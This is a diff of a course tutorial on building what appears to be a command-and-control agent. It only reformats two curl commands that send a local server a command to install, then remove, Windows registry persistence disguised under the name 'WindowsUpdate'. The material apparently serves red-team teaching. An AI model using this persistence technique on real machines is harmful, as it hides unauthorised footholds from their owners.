@@ -516,15 +516,7 @@ go run ./cmd/server
 **Step 5: Queue the persistence command**
 
 ```bash
-curl -X POST http://localhost:8080/command \
-  -d '{
-    "command": "persist",
-    "data": {
-      "method": "registry",
-      "name": "WindowsUpdate",
-      "remove": false
-    }
-  }'
+curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"method": "registry", "name": "WindowsUpdate", "remove": false}}'
 ```
 
 **Expected server output:**
@@ -561,15 +553,7 @@ Your agent survived a reboot.
 **Step 8: Remove persistence (cleanup)**
 
 ```bash
-curl -X POST http://localhost:8080/command \
-  -d '{
-    "command": "persist",
-    "data": {
-      "method": "registry",
-      "name": "WindowsUpdate",
-      "remove": true
-    }
-  }'
+curl -X POST http://localhost:8080/command -d '{"command": "persist", "data": {"method": "registry", "name": "WindowsUpdate", "remove": true}}'
 ```
 
 ## Course Recap
